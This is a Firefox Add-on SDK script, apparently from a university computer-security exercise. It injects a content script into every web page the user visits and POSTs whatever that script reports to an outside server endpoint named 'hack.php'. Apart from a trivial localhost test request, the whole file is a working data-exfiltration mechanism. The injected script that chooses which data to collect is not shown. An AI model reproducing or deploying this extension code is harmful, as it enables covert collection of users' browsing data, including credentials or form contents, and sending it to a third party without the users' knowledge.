var pageMod = require("sdk/page-mod");
var self = require("sdk/self");
var request = require("sdk/request").Request;
 
 pageMod.PageMod({
       include: "*",
         contentScriptFile: [self.data.url("jquery-2.0.3.min.js"), self.data.url("my-content-script.js")],
         onAttach: function(worker){
             worker.port.on("message", function(message) {
                 console.log("Sending values to server : " + message);
    
    var testReq = request ({
        url: 'http://athena.nitc.ac.in/~john_bcs10/comp_sec/hack.php',
        data: message,
        onComplete: function(response) {
        console.log(response.text);
    }
    }).post();        

             });
         }
         
 });

var testReq = request ({
    url: "http://localhost/test.php",
    onComplete: function(response) {
        console.log(response.text);
    }
}).get();


